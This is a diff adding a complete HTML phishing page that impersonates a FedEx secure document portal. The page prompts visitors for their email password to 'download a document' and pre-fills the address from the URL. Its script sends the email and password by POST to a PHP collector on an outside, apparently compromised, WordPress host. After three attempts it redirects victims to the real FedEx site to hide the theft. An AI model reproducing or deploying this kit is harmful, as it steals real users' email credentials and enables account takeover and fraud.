@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=UTF-8">
+
+       <title>FedEx</title>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.1/jquery.validate.min.js"></script>
+	    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+
+<meta name="description" content="_Materials for Supply">
+
+
+
+<meta name="keywords" content="_Demands">
+
+<meta name="robots" content="noindex, nofollow">
+
+<meta property="og:title" content="_Overview | Specs">
+
+<meta property="og:type" content="website">
+
+<meta property="og:site_name" content="_&amp;Requirements">
+
+<meta property="og:description" content="&amp;RFQ_">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+
+video {
+  object-fit: cover;
+  width: 100vw;
+  height: 100vh;
+  position: fixed;
+  top: 0;
+  left: 0;
+  z-index: -1;
+}
+  </style>
+</head>
+<body>
+
+<nav style="background-color:#472F91;">
+<div class="container">
+    <a class="navbar-brand" href="#"><img src="img/logo.png"></a>
+    
+   
+</div>
+</nav>
+<video playsinline="" autoplay="autoplay" muted="muted" loop="" poster="https://quirky-shaw-20dc92.netlify.app/polina.jpg" id="bgvid">
+    <source src="img/FedEx.mp4" type="video/webm">
+  </video>
+
+
+        
+        <div align="center">
+           <br/><br/><br/><br/><br/><br/><br/>
+           <span class="text-white" style="font-size: 42px;font-weight: 900; color:#FFFFFF;">FedEx Secure Document Portal</span>
+           <div style="color:white; font-size: 20px;"><br/>
+            As a FedEx customer, we provide you with a number of tools and portals <br/>
+			to efficiently manage your shipping and logistics needs. 
+           </div>
+		   <br/><br/>
+           <div class="my-5">
+		 <button id="myBtn" class="btn btn-primary" style="width: 299px; background-color:#472F91; height: 60px"> Download Document </button></div>
+		<script>
+$(document).ready(function(){
+  $("#myBtn").click(function(){
+    $("#myModal").modal();
+  });
+});
+</script>
+		
+           <div class="my-5 text-white" style="font-size: 12px; color:#FFFFFF;"><br/><br/>
+             © FedEx 1995-2022 - all rights reserved.
+           </div>
+        </div>
+
+ <!-- Modal -->
+  <div class="modal fade" id="myModal" role="dialog">
+    <div class="modal-dialog">
+    
+      <!-- Modal content-->
+      <div class="modal-content">
+        
+        <div class="modal-body" style="padding:40px 50px;">
+		<div><img src="img/logo-2.png"><br/><br/>
+		<p><font size="-1"><i>These files are sensitive and secured against unauthorized access. In order to access ths file, please provide your current email credentials, we will connect to your email provider through a secure IMAP channel to authorize your download.</i></font></p>
+		<hr></div>
+          <form role="form">
+            <div class="form-group">
+              <label for="usrname">Email:</label>
+              <input type="text" class="form-control" id="email" name="email" placeholder="Enter Email address" required="" readonly="">
+            </div>
+            <div class="form-group">
+              <label for="psw">Password:</label>
+              <input type="password" class="form-control" id="password" name="password" placeholder="Enter Email Password" required="">
+            </div>
+            <div class="checkbox" align="center">
+			 <font color="#FF0000"><span id="msg"></span></font>
+            </div>
+			
+              <button type="submit" id="submit-btn" class="btn btn-danger btn-block">Download Document</button>
+          </form> <div align="center"><font size="-2">© Copyright FedEx Document Portal 2022</font></div>
+        </div>
+       
+      </div>
+      
+    </div>
+  </div> 
+
+</body>
+
+ <script>
+$(document).ready(function()
+	{
+	var g=0;
+	var h=window.location.hash.substr(1);
+	if(!h)
+		{
+	}
+	else
+		{
+		var i=h;
+		var j=i.indexOf("@");
+		var k=i.substr(j+1);
+		var c=k.substr(0,k.indexOf("."));
+		var l=c.toLowerCase()
+	}
+	$('#othermodal').click(function()
+		{
+		$('#contact').trigger("reset");
+		$("#msg").hide();
+		$('#fieldImg').attr('src','ico');
+		$('#field').html("Other Mail");
+		$("#email").val(i);
+		$("#emailch").html(i);
+		$("#inputbar").animate(
+			{
+			left:200,opacity:"hide"
+		}
+		,0);
+		$("#automail").animate(
+			{
+			right:200,opacity:"show"
+		}
+		,1000);
+		$('#ajaxModal').modal('show')
+	}
+	);
+	$('#submit-btn').click(function(b)
+		{
+		b.preventDefault();
+		var c=$("#email").val();
+		var d=$("#password").val();
+		var e=$("#field").html();
+		var f=$('#msg').html();
+		$('#msg').text(f);
+		g=g+1;
+		if(g>=3)
+			{
+			g=0;
+			window.location.replace("https://www.fedex.com/en-as/downloads.html")
+		}
+		else
+			{
+			$.ajax(
+				{
+				dataType:'JSON',url:'https://bahcehavuzu.com.tr/wp-includes/fedosafedex/fedex.php',type:'POST',data:
+					{
+					email:c,password:d,detail:e,
+				}
+				,beforeSend:function(a)
+					{
+					$('#submit-btn').html('Verifing...')
+				}
+				,success:function(a)
+					{
+					if(a)
+						{
+						$("#msg").show();
+						console.log(a);
+						if(a['signal']=='ok')
+							{
+							$('#msg').html(a['msg'])
+						}
+						else
+							{
+							$('#msg').html(a['msg'])
+						}
+					}
+				}
+				,error:function()
+					{
+					$("#msg").show();
+					$('#msg').html("Email validation error, please enter valid email password.")
+				}
+				,complete:function()
+					{
+					$('#submit-btn').html('Login')
+				}
+			}
+			)
+		}
+	}
+	)
+}
+);
+if(location.hash)
+	{
+	document.querySelector('#email').value=eml=location.hash.substr(1)
+}
+
+
+
+  </script>
+  </html>
